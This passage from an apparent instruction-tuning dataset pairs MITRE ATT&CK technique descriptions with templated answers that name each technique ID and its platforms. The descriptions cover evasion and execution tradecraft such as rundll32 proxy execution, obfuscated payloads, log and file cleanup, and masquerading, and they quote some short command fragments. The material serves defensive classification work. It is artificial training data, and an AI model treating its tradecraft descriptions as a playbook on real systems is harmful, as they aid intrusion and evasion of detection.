      "question": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "answer": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
    "context": "",
    "output": "The provided description is related to MITRE technique Exploitation for Privilege Escalation (T1068);\nTechnique Exploitation for Privilege Escalation (T1068) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
      "answer": "The provided description is related to MITRE technique Exploitation for Privilege Escalation (T1068);\nTechnique Exploitation for Privilege Escalation (T1068) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "answer": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. \n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject\"</code>  This behavior has been seen used by malware such as Poweliks. \n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Binary Proxy Execution: Rundll32 (T1218.011);\nTechnique System Binary Proxy Execution: Rundll32 (T1218.011) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. \n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject\"</code>  This behavior has been seen used by malware such as Poweliks. \n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.",
      "answer": "The provided description is related to MITRE technique System Binary Proxy Execution: Rundll32 (T1218.011);\nTechnique System Binary Proxy Execution: Rundll32 (T1218.011) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
    "context": "",
    "output": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
      "answer": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
      "answer": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.",
    "context": "",
    "output": "The provided description is related to MITRE technique Network Service Discovery (T1046);\nTechnique Network Service Discovery (T1046) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.",
      "answer": "The provided description is related to MITRE technique Network Service Discovery (T1046);\nTechnique Network Service Discovery (T1046) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is applicable to platforms: Google Workspace,  Linux,  Network,  Office 365,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Google Workspace,  Linux,  Network,  Office 365,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
      "answer": "The provided description is related to MITRE technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is applicable to platforms: Google Workspace,  Linux,  Network,  Office 365,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Google Workspace,  Linux,  Network,  Office 365,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.?",
    "context": "",
    "output": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
      "answer": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: PowerShell (T1059.001);\nTechnique Command and Scripting Interpreter: PowerShell (T1059.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: PowerShell (T1059.001);\nTechnique Command and Scripting Interpreter: PowerShell (T1059.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to Acquire Infrastructure for follow-on purposes.\n\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.",
    "context": "",
    "output": "The provided description is related to MITRE technique Establish Accounts: Email Accounts (T1585.002);\nTechnique Establish Accounts: Email Accounts (T1585.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to Acquire Infrastructure for follow-on purposes.\n\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.",
      "answer": "The provided description is related to MITRE technique Establish Accounts: Email Accounts (T1585.002);\nTechnique Establish Accounts: Email Accounts (T1585.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
